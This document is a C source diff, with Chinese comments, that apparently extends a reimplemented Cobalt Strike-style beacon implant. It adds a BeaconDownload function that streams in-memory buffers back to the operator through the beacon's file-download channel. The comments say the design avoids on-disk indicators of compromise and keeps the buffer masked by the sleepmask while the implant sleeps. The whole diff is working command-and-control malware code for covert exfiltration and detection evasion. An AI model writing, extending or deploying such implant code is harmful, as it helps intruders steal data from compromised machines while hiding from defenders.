@@ -12,7 +12,10 @@
 typedef struct {
 	unsigned int    id;
 	unsigned int    toread;
-	HANDLE handle; /* Win32 句柄：瘦身——拔掉 CRT stdio 文件 I/O 链 */
+	HANDLE handle; /* Win32 句柄：瘦身——拔掉 CRT stdio 文件 I/O 链。
+	                  内存下载路径（BeaconDownload）handle 恒为 NULL。 */
+	char * mem;    /* 4.12 BeaconDownload：beacon 自持的缓冲副本（NULL=文件路径） */
+	unsigned int mempos; /* 内存路径：已发出的字节数 */
  	void * next;
 } file_entry;
 
@@ -21,7 +24,23 @@ static void download_entry_cleanup(void * p) {
 	file_entry * entry = (file_entry *)p;
 	if (entry->handle != NULL && entry->handle != INVALID_HANDLE_VALUE)
 		beacon_CloseHandle(entry->handle);
+	if (entry->mem != NULL) {
+		track_memory_remove(entry->mem);
+		free(entry->mem);
+		entry->mem = NULL;
+	}
 	memset(entry, 0, sizeof(file_entry));
+	free(entry);
+}
+
+/* 内存条目的登记/释放小助手：copy 已 track_memory_add 过（掩码诉求） */
+static void download_entry_drop(file_entry * entry) {
+	track_memory_remove(entry);
+	if (entry->mem != NULL) {
+		track_memory_remove(entry->mem);
+		free(entry->mem);
+		entry->mem = NULL;
+	}
 	free(entry);
 }
 
@@ -148,6 +167,25 @@ void process_download(file_entry * entry, void (*callback)(char * buffer, int le
 	temp = htonl(entry->id);
 	memcpy(read_buffer, (char *)&temp, 4);
 
+	/* 4.12 BeaconDownload：内存缓冲路径——无句柄，直接从自持副本流式送出 */
+	if (entry->handle == NULL && entry->mem != NULL) {
+		readme = (entry->toread > (unsigned int)max) ? (unsigned int)max : entry->toread;
+		memcpy(read_buffer + 4, entry->mem + entry->mempos, readme);
+		len                  = readme;
+		entry->toread       -= readme;
+		entry->mempos       += readme;
+
+		callback(read_buffer, len + 4, CALLBACK_FILE_WRITE);
+		process_close(entry, callback);
+		return;
+	}
+	if (entry->handle == NULL) {
+		/* 无句柄也无缓冲：异常条目，按完成处理防死循环 */
+		entry->toread = 0;
+		process_close(entry, callback);
+		return;
+	}
+
 	/* 我们想要读取多少数据？ */
 	if (entry->toread > max) {
 		readme = max;
@@ -187,8 +225,10 @@ void process_close(file_entry * entry, void(*callback)(char * buffer, int length
 	if (entry->toread <= 0) {
 		temp = htonl(entry->id);
 		callback((char *)&temp, 4, CALLBACK_FILE_CLOSE);
-		beacon_CloseHandle(entry->handle);
-		entry->handle = INVALID_HANDLE_VALUE; /* 已关闭；置位供 cleanup 判定，防双重关闭 */
+		if (entry->handle != NULL && entry->handle != INVALID_HANDLE_VALUE) {
+			beacon_CloseHandle(entry->handle);
+			entry->handle = INVALID_HANDLE_VALUE; /* 已关闭；置位供 cleanup 判定，防双重关闭 */
+		}
 	}
 }
 
@@ -235,14 +275,12 @@ void download_poll(void (*callback)(char * buffer, int length, int type), int ma
 		if (entry->toread <= 0) {
 			if (prev == NULL) {
 				download_list = (file_entry*)entry->next;
-				track_memory_remove(entry); /* 正常路径释放前先注销，防退出时二次释放 */
-				free(entry);
+				download_entry_drop(entry); /* 正常路径释放前已注销，防退出时二次释放 */
 				entry = NULL;
 			}
 			else {
 				prev->next = entry->next;
-				track_memory_remove(entry);
-				free(entry);
+				download_entry_drop(entry);
 				entry = (file_entry*)prev->next;
 			}
 		}
@@ -251,4 +289,86 @@ void download_poll(void (*callback)(char * buffer, int length, int type), int ma
 			entry = (file_entry*)entry->next;
 		}
 	}
+}
+
+/* ---------------------------------------------------------------------------
+ * 4.12 BeaconDownload BOF API (tier-3 item 9)
+ *
+ *   BOOL BeaconDownload(const char *filename, const char *buffer,
+ *                       unsigned int length);
+ *
+ * 官方契约（4.12 手册 BOF C API 节）：
+ *   - 把一段内存缓冲经 beacon 原生下载通道回传（View -> Downloads 查看），
+ *     免落盘 IOC；
+ *   - beacon 会自行拷贝缓冲，BOF 返回后可安全释放原内存继续执行；
+ *   - 缓冲在睡眠期由 sleepmask 掩蔽（这里通过 track_memory 的堆登记实现，
+ *     与官方 "The Sleepmask masks the buffer whilst Beacon is sleeping" 对齐）；
+ *   - 上限 2GB。
+ * wire 帧与磁盘下载完全一致：CALLBACK_FILE 首帧 [id][size][filename]、
+ * CALLBACK_FILE_WRITE 分块 [4B BE id][data]、CALLBACK_FILE_CLOSE [4B BE id]，
+ * 客户端 BeaconDownloads 无差别收包拼装。
+ * --------------------------------------------------------------------------- */
+BOOL beacon_download_buffer(const char * filename, const char * buffer, unsigned int length) {
+	file_entry * entry;
+	char       * copy;
+	unsigned int fnlen;
+	formatp      builder;
+	char       * out;
+	int          outlen;
+	extern void  command_shell_callback(char * buffer, int length, int type);
+
+	if (filename == NULL || filename[0] == '\0')
+		return FALSE;
+	if (length > 0x7FFFFFFF) /* 官方 2GB 上限 */
+		return FALSE;
+	if (length > 0 && buffer == NULL)
+		return FALSE;
+
+	/* beacon 自持副本：BOF 原缓冲可立即释放（官方契约） */
+	copy = NULL;
+	if (length > 0) {
+		copy = (char *)malloc(length);
+		if (copy == NULL)
+			return FALSE;
+		memcpy(copy, buffer, length);
+		/* 登记 track_memory：退出兜底 + 睡眠期掩蔽 */
+		track_memory_add(copy, length, TRACK_MEMORY_MALLOC, TRUE, NULL);
+	}
+
+	entry = (file_entry *)malloc(sizeof(file_entry));
+	if (entry == NULL) {
+		if (copy != NULL) {
+			track_memory_remove(copy);
+			free(copy);
+		}
+		return FALSE;
+	}
+
+	entry->handle = NULL;    /* 内存路径标记 */
+	entry->mem    = copy;
+	entry->mempos = 0;
+	entry->toread = length;
+	entry->id     = download_id;
+	entry->next   = download_list;
+	download_list = entry;
+	track_memory_add(entry, sizeof(file_entry), TRACK_MEMORY_CLEANUP_FUNC, FALSE, download_entry_cleanup);
+	download_id++;
+
+	/* 首帧：[id][size][filename]，与 command_download 相同形状 */
+	fnlen = (unsigned int)strlen(filename);
+	bformat_init(&builder, 256 + fnlen);
+	bformat_int(&builder, entry->id);
+	bformat_int(&builder, length);
+	bformat_copy(&builder, filename, fnlen);
+
+	out = bformat_string(&builder);
+	outlen = bformat_length(&builder);
+	command_shell_callback(out, outlen, CALLBACK_FILE);
+	bformat_free(&builder);
+
+	/* 零长度下载立即收尾（空文件） */
+	if (length == 0)
+		process_close(entry, command_shell_callback);
+
+	return TRUE;
 }
